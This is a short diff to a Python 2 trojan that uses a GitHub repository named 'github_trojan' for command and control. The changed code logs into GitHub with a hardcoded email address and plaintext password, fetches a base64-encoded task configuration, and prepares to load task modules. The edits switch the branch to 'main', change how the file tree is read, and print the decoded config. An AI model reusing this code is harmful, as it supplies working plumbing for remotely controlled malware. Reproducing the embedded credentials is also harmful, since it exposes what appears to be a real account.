@@ -27,14 +27,15 @@ task_queue = Queue.Queue()
 def connect_to_github():
     gh = login(username="1463486688@qq.com", password="gh2526@lv1123")
     repo = gh.repository("sectestt", "github_trojan")
-    branch = repo.branch("master")
+    branch = repo.branch("main")
     
     return gh, repo, branch
     
     
 def get_file_contents(filepath):
     gh, repo, branch = connect_to_github()
-    tree = branch.commit.commit.tree.recurse()
+    #tree = branch.commit.commit.tree.recurse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
     
     for filename in tree.tree:
         if filepath in filename.path:
@@ -50,6 +51,8 @@ def get_trojan_config():
     config_json = get_file_contents(trojan_config)
     config = json.loads(base64.b64decode(config_json))
     configured = True
+    print "config: "
+    print config
     
     for task in config:
         if task["module"] not in sys.modules:
